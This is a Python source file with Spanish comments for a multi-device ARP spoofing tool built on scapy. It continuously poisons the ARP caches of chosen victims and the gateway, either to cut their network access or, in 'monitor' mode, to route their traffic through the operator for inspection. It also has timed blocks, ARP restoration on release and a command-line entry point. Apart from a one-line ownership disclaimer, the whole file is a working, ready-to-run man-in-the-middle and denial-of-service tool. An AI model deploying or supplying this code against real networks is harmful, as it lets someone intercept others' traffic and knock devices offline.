"""Gestor de bloqueo ARP multi-dispositivo.

Sustituye a script.py: en lugar de una sola víctima con una global
`ataque_activo`, maneja N objetivos a la vez, cada uno con su hilo y su
threading.Event, y restaura las tablas ARP al desbloquear para no dejar la
red rota.

USO LEGÍTIMO: solo en una red que administras/posees.
"""
from __future__ import annotations

import threading
import time
from dataclasses import dataclass, field

from scapy.all import ARP, send

from net import get_gateway_ip, get_mac


@dataclass
class Target:
    ip: str
    mac: str | None
    stop: threading.Event = field(default_factory=threading.Event)
    thread: threading.Thread | None = None
    expires_at: float | None = None  # epoch; None = indefinido
    mode: str = "block"  # "block" (corta) | "monitor" (redirige, no corta)


class BlockManager:
    """Bloquea/desbloquea varios dispositivos por ARP spoofing en paralelo."""

    def __init__(self, gateway_ip: str | None = None, interval: float = 2.0):
        self.gateway_ip = gateway_ip or get_gateway_ip()
        self.gateway_mac = get_mac(self.gateway_ip)
        self.interval = interval
        self._targets: dict[str, Target] = {}
        self._lock = threading.Lock()
        if not self.gateway_mac:
            raise RuntimeError(
                f"No se pudo resolver la MAC del gateway {self.gateway_ip}. "
                "¿Estás como root/admin y en la red correcta?"
            )

    # ---- API pública -------------------------------------------------
    def block(self, ip: str, duration: float | None = None,
              mode: str = "block") -> bool:
        """Empieza a envenenar una IP. Devuelve False si ya estaba o sin MAC.

        mode="block" corta el tráfico (sin IP forwarding); mode="monitor"
        redirige el tráfico por nosotros para inspeccionarlo (requiere IP
        forwarding activo en el SO, si no, también lo cortaría).

        Si `duration` (segundos) se indica, expira solo; usa `expired()` desde
        el bucle de refresco para desbloquear los vencidos.
        """
        with self._lock:
            if ip in self._targets:
                return False
            mac = get_mac(ip)
            if not mac:
                return False
            target = Target(ip=ip, mac=mac, mode=mode)
            if duration:
                target.expires_at = time.time() + duration
            target.thread = threading.Thread(
                target=self._poison_loop, args=(target,), daemon=True
            )
            self._targets[ip] = target
            target.thread.start()
            return True

    def unblock(self, ip: str) -> bool:
        """Detiene el bloqueo de una IP y restaura su ARP."""
        with self._lock:
            target = self._targets.pop(ip, None)
        if not target:
            return False
        target.stop.set()
        if target.thread:
            target.thread.join(timeout=self.interval + 1)
        self._restore(target)
        return True

    def unblock_all(self) -> None:
        for ip in list(self._targets.keys()):
            self.unblock(ip)

    def blocked_ips(self) -> list[str]:
        """Solo las IPs realmente bloqueadas (no las que están en monitoreo)."""
        with self._lock:
            return [ip for ip, t in self._targets.items() if t.mode == "block"]

    def is_blocked(self, ip: str) -> bool:
        t = self._targets.get(ip)
        return t is not None and t.mode == "block"

    def is_monitoring(self, ip: str) -> bool:
        t = self._targets.get(ip)
        return t is not None and t.mode == "monitor"

    def is_active(self, ip: str) -> bool:
        """¿Hay envenenamiento activo (bloqueo o monitoreo) sobre esta IP?"""
        return ip in self._targets

    def remaining(self, ip: str) -> float | None:
        """Segundos restantes de un bloqueo temporizado; None si es indefinido."""
        target = self._targets.get(ip)
        if not target or target.expires_at is None:
            return None
        return max(0.0, target.expires_at - time.time())

    def expired(self) -> list[str]:
        """IPs cuyo bloqueo temporizado ya venció (para auto-desbloquear)."""
        now = time.time()
        with self._lock:
            return [
                ip for ip, t in self._targets.items()
                if t.expires_at is not None and now >= t.expires_at
            ]

    # ---- Interno -----------------------------------------------------
    def _poison_loop(self, target: Target) -> None:
        while not target.stop.is_set():
            # A la víctima: "el gateway soy yo"
            send(ARP(op=2, pdst=target.ip, psrc=self.gateway_ip,
                     hwdst=target.mac), verbose=0)
            # Al gateway: "la víctima soy yo"
            send(ARP(op=2, pdst=self.gateway_ip, psrc=target.ip,
                     hwdst=self.gateway_mac), verbose=0)
            target.stop.wait(self.interval)

    def _restore(self, target: Target, count: int = 5) -> None:
        if not target.mac or not self.gateway_mac:
            return
        # Restaura a la víctima con la MAC real del gateway
        send(ARP(op=2, pdst=target.ip, psrc=self.gateway_ip,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac),
             count=count, verbose=0)
        # Restaura al gateway con la MAC real de la víctima
        send(ARP(op=2, pdst=self.gateway_ip, psrc=target.ip,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target.mac),
             count=count, verbose=0)


if __name__ == "__main__":
    import sys

    mgr = BlockManager()
    print(f"Gateway {mgr.gateway_ip} ({mgr.gateway_mac})")
    print("IPs a bloquear separadas por espacio (Ctrl+C para salir):")
    try:
        for ip in sys.argv[1:]:
            print("bloqueando" if mgr.block(ip) else "no se pudo", ip)
        while mgr.blocked_ips():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nRestaurando red...")
        mgr.unblock_all()
